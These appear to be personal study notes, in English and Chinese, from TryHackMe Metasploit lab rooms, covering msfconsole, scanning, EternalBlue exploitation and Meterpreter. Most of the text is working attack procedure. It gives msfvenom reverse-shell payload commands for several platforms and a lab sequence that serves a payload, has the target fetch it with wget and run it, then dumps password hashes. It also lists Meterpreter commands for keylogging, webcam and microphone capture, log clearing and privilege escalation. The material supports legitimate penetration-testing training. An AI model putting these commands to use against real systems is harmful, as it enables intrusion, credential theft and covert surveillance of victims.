## Metasploit: Introduction
	--> start : msfconsole

	--> msfconsole: The main command-line interface
	--> Modules: supporting modules such as exploits, scanners, payloads, etc.
	--> Tools: Stand-alone tools that will help vulnerability research
		--> msfvenom、pattern_create 、pattern_offset
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Exploit : 利用目標系統上存在的漏洞的一段程式碼。
	--> Vulnerability:
	--> Payload : 是將在目標系統上運行的程式碼
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Auxiliary : 任何支援模組，例如掃描器、爬蟲和模糊器
	--> Encoders  : 允許您對漏洞和有效負載進行編碼
	--> Evasion   : 逃避防毒軟體
	--> Exploits  : 漏洞利用，按目標系統整齊地組織
	--> NOPs      : 0x90 
	--> Payloads  : 有效負載是將在目標系統上運行的程式碼。
		--> adapters(不同的格式)
		--> single
		--> stagers 負責在Metasploit和目標系統之間建立連線通
		--> stage 允許您使用更大的有效負載
		
		--> single : generic/shell_reverse_tcp
		--> stage : windows/x64/shell/reverse_tcp
	--> Post
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> msfconsole 
		--> msf6 > ls =>  ping -c 1 8.8.8.8
		--> help set : set [option] [value]
		--> history : 查看先前輸入的命令
		--> use 搜尋結果行開頭的命令後面跟著數字來選擇要使用的模組
		--> show  :  module type (auxiliary, payload, exploit, etc.) 
			--> show options
			--> show payloads
		--> back 離開
		--> info 來獲取有關任何模組的更多資訊
		--> search 在 Metasploit 框架資料庫中搜尋與給定搜尋參數相關的模組
			--> 使用CVE編號、漏洞名稱（eternalblue、heartbleed 等）或目標系統進行搜尋
		--> set
			--> RHOSTS  : “遠端主機”
			--> RPORT   : “遠端連接埠”
			--> PAYLOAD : 
			--> LHOST   : “Localhost”
			--> LPORT   : “本機連接埠”
			--> SESSION : 
		--> unset all : 清除所有設定的參數
		--> setg : 預設情況下可以在不同模組中使用該值 (g 全域值)
		--> unsetg
		--> exploit : 啟動模組 can add -z
			--> exploit -z : 會話開啟後立即執行漏洞利用程式並將其置於背景
		--> run
		--> check : 檢查目標系統是否容易受到攻擊而不利用它
		--> background : 使會話提示字元後台化並返回 msfconsole 提示字元
			--> meterpreter > background
				--> msf6 exploit(windows/smb/ms17_010_eternalblue) >
		--> sessions
			--> sessions -i id
		
	--> example : ms17_010_eternalblue
	
		--> use exploit/windows/smb/ms17_010_eternalblue 
		--> show options => Module options
		--> show payloads
		--> info exploit/windows/smb/ms17_010_eternalblue
		--> search ms17-010
		--> use 0(#) 代替 use auxiliary/admin/smb/ms17_010_command (Name)
		--> search type:auxiliary telnet 搜尋結果僅包含輔助模組
			
	--> msfconsole
	--> 常規命令提示符 : root@ip-10-10-XX-XX:~#
	--> msfconsole 提示字元： msf6 >
	--> 上下文提示 : msf6 exploit(windows/smb/ms17_010_eternalblue) >	
		--> 設定為目標系統的 IP 位址  set RHOSTS 10.10.xx 
		--> show options
	--> Meterpreter提示 : meterpreter >
	--> 目標系統上的 shell： C:\Windows\system32>
	
## Metasploit: Exploitation
	--> /usr/share/wordlists/metasploit
	--> 2024_5_CTF/try_hack_me/Jr_Penetration_Tester/task/MetasploitWordlist.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Port Scanning : 
		--> option1 :
			--> msf6 > nmap -sS 10.10.12.229
		--> option2 :
			--> msf6 >search portscan --> use 5(id)
			--> show options
			--> set  : 
				--> CONCURRENCY：同時掃描的目標數量。
				--> PORTS：要掃描的連接埠範圍
				--> RHOTS：要掃描的目標或目標網路
					--> set RHOTS 10.10.165.109
				--> THREADS：將同時使用的執行緒數。更多線程將導致更快的掃描
		--> 快速識別 UDP : scanner/discovery/udp_sweep
		--> SMB掃描 : scanner/smb/smb_version
		-->  "exotic" services 
			-->  NetBIOS (Network Basic Input Output System) = SMB
			--> 無需密碼共用檔案和資料夾（例如 admin、administrator、root、toor 等）
	
		--> task Hint : 
			--> ports : nmap 
			--> NetBIOS name : netbios/nbname
			--> port 8000 :  http_version
			--> SMB password : smb_login
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> PostgreSQL 資料庫 : 
		--> start : systemctl start postgresql
		--> msfdb init: 初始化Metasploit資料庫 
		--> db_status : 啟動並檢查資料庫狀態 
		--> workspace : 命令列出可用的工作區 
			--> workspace -a tryhackme 建立了一個名為「tryhackme」的新工作區
			--> workspace -d tryhackme 刪除名為「tryhackme」的工作區
			--> workspace -h 可用選項
		--> help 顯示資料庫後端命令選單
		--> db_nmap : 執行Nmap掃描  儲存到資料庫 | 尋找可用主機
			--> db_nmap -sV -p- 10.10.12.229
		--> hosts 取得與目標系統上執行的主機
			--> address       mac                name 
			--> hosts -R 將此值新增至 RHOSTS 參數
		--> services 取得服務相關的資訊
			--> host          port   proto  name               state  info
			-->  services -S services 允許您搜尋環境中的特定服務
				-->  services -S netbios  
		--> example : 	
			--> search MS17-010
			--> hosts -R 10.10.165.109
			
		--> 容易實現的目標 low-hanging fruits  --> get  root
			--> HTTP : SQL 注入 //  RCE 
			--> FTP  : 匿名登入並提供對有趣檔案的存取
			--> SMB  : MS17-010 等SMB漏洞的攻擊
			--> SSH  : 預設或容易猜測的憑證
			--> RDP  : Bluekeep 的攻擊或允許桌面存取
			
		--> vnc_login 模組可以幫助我們找到VNC服務的登入詳細資訊
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Exploitation
		--> search 命令搜尋漏洞利用程序
		--> info 命令獲取有關該漏洞利用程序的更多信息
		--> exploit 啟動該漏洞程序
		
		--> show payloads => set payload => show options => set P/LHOST =>exploit
			--> in => C:\Windows\system32>
			--> CTRL+Z 將其置於背景 
		--> sessions 命令將列出所有活動會話 =>  sessions -h
			--> sessions -i後接會話 ID 的命令與任何現有會話進行互動
			-->  > sessions -i 1
			
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> Msfvenom : Msfpayload 和 Msfencode
		--> 不同的目標系統（Apple、Windows、Android、 Linux等）
		--> 建立多種不同格式（PHP、exe、dll、elf 等）的payload
		--> msfvenom -l payloads 
		
		--> Output formats  : msfvenom --list formats
		--> Encoders raw -e 
			--> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
		--> Handlers : 反向 shell 的漏洞類似
			--> msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
				--> 輸出PHP檔案將錯過註釋的起始PHP標記和結束標記 ( ?>) | cat reverse_shell.php
				--> 從檔案開頭刪除的註解 (<?php) and 新增了結束標籤 (?>)
	 		--> msf6 > use exploit/multi/handler => run
	 		
	 --> Other Payloads (反向負載) : 
	 	--> 偵聽exploit/multi/handler模​​組 --LHOST 和 LPORT 
	 	
	 	--> Linux可執行和可連結格式 (elf)
	 		--> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
	 		--> 一旦目標電腦上有 shell.elf 文件，請使用 chmod +x shell.elf 指令授予可執行權限
	 		--> ./shell.elf 來執行此檔案
	 	--> Windows 
	 		--> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
	 	--> PHP
	 		--> msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
	 	--> ASP
	 		--> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
	 	--> Python
	 		--> msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
	 		
	 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	 
	 --> TASK : to get other user's password hash
	 	--> 終端1 :
		 	--> ssh murphy@10.10.50.32
		 	--> sudo su // root
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 	
	 	--> 終端2 :
		 	--> kali -- copy a file to shell.elf : msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.92.230 LPORT=4444 -f elf > shell.elf
		 	
		 	--> msfconsole 
			--> use exploit/multi/handler 
			--> set payload linux/x86/meterpreter/reverse_tcp
			--> set LHOST 10.11.92.230
			--> set LPORT 4444 
			--> show options 
			--> run
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> 終端3 :
			-->開啟一個簡易的webserver: python3 -m http.server 9000
			
		--> 終端1 : under ssh 
			--> wget http://10.11.92.230:9000/shell.elf
			--> chmod 777 shell.elf
			--> ./shell.elf
			
		--> back to 終端2 : meterpreter > 
			--> run post/linux/gather/hashdump : 利用模組轉儲系統上其他使用者的雜湊值
		
## Metasploit: Meterpreter
	--> 避免在防毒掃描期間被偵測到
	--> 避免被基於網路的 IPS（入侵防禦系統）和IDS （入侵偵測系統）
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> upgrade to meterpreter 
		--> search shell_to_meterpreter 
			=> 開啟另一個新會話 use 0 => use post/multi/manage/shell_to_meterpreter 
			=> sessions -l => show options => set SESSION 1 => run 
			=> 選擇該會話並執行該會話 session -l => sessions -i <New-meterpeter-session>
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
	--> 了解可用Meterpreter版本
		--> msfvenom --list payloads | grep meterpreter
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> use exploit/multi/handler : 用於接收反向shell	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> 使用哪個版本的Meterpreter
		--> 目標作業系統
		--> 目標系統上可用的元件（是否安裝了Python？這是一個PHP網站嗎？等）
		--> 與目標系統建立的網路連線類型（它們是否允許原始TCP連線 //Https )
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> command : help 列出所有可用命令
	
	--> meterpreter > 
		--> other : https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
		--> search -f flag.txt : find file 
		--> background : 返回「msf」提示符
		--> cat | cd | pwd 
			--> cd ../../ => c:\ --> cd  
			--> cat "C:\"
		--> download c:\\boot.ini  : 從遠端電腦下載檔案
		--> edit edit.txt : vim
		--> execute -f cmd.exe -i -H : 在目標上運行命令
		--> getuid : 顯示 Meterpreter 伺服器在主機上執行的使用者
			--> 使您了解目標系統上可能的權限等級
		--> run post/windows/gather/hashdump : hashdump post模組將轉儲SAM資料庫的內容。
		--> hashdump :  NTLM hash password  -->  https://crackstation.net/
			--> 列出 SAM （安全帳戶管理員）資料庫的內容
			--> Windows 系統上的使用者密碼  以NTLM（新技術 LAN 管理器）格式儲存
			
		--> idletime : 顯示遠端電腦上的使用者空閒的秒數
		--> ipconfig
		--> shell => C:\WINDOWS\system32>
		--> upload evil_trojan.exe c:\\windows\\system32
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> getpid : 執行 Meterpreter 的進程 ID
		--> ps : (find file pid)
			--> 列出目標系統上執行的進程
			--> PID列還將為您提供將Meterpreter遷移到另一個進程所需的PID資訊
			--> Name : system file // xx.exe
			
		--> migrate pid  
			--> migrate 764(lsass.exe) 
			--> hashdump NTLM Hash
		-->  load python : load 指令來利用其他工具
		
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> 核心指令 Core commands :
		--> background：目前會話的背景
		-->exit：終止Meterpreter會話
		-->guid：取得會話GUID（全域唯一識別碼）
		-->help：顯示幫助選單
		-->info：顯示Post模組的訊息
		-->irb：在目前會話上開啟互動式 Ruby shell
		-->load：載入一個或多個Meterpreter擴展
		-->migrate：允許您將Meterpreter遷移到另一個進程
		-->run：執行Meterpreter腳本或Post模組
		-->sessions：快速切換到另一個會話
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> 檔案系統指令 File system commands:
		-->cd: 將更改目錄
		-->ls：將列出目前目錄中的檔案（dir也可以）
		-->pwd：列印目前工作目錄
		-->edit：將允許您編輯文件
		-->cat：將文件的內容顯示到螢幕上
		-->rm：將刪除指定文件
		-->search：將搜尋文件
		-->upload：將上傳檔案或目錄
		-->download：將下載檔案或目錄
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> 聯網指令 Networking commands: 
		-->arp：顯示主機ARP（位址解析協定）緩存
		-->ifconfig：顯示目標系統上可用的網路介面
		-->netstat：顯示網路連線狀況
		-->portfwd：將本機連接埠轉送到遠端服務
		-->route：允許檢視和修改路由表
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> 系統指令 System commands
		-->clearev：清除事件日誌
		-->execute：執行命令
		-->getpid：顯示目前進程標識符
		-->getuid：顯示Meterpreter正在運作的用戶
		-->kill: 終止一個進程
		-->pkill：按名稱終止進程
		-->ps：列出正在運行的進程
		-->reboot：重新啟動遠端電腦
		-->shell：進入系統指令 shell
		-->shutdown：關閉遠端電腦
		-->sysinfo：獲取遠端系統的信息，例如OS
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> 其他命令（這些命令將在說明選單中的不同選單類別中列出）
		-->idletime：傳回遠端使用者空閒的秒數
		-->keyscan_dump：轉儲擊鍵緩衝區
		-->keyscan_start：開始捕獲擊鍵
		-->keyscan_stop：停止捕獲擊鍵
		-->screenshare：允許您即時觀看遠端使用者的桌面
		-->screenshot：抓取互動式桌面的螢幕截圖
		-->record_mic：從預設麥克風錄製音訊 X 秒
		-->webcam_chat：開始視訊聊天
		-->webcam_list：列出網路攝影機
		-->webcam_snap：從指定的網路攝影機拍攝快照
		-->webcam_stream：播放指定網路攝影機的視訊串流
		-->getsystem：嘗試將您的權限提升到本機系統的權限
		-->hashdump：轉儲SAM資料庫的內容
		
		--> TASK
			--> sysinfo : 計算機名稱
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	PAYLOAD : 
		set PAYLOAD windows/meterpreter/reverse_tcp
		set PAYLOAD windows/shell/reverse_tcp 
		set PAYLOAD windows/shell_reverse_tcp


		
		
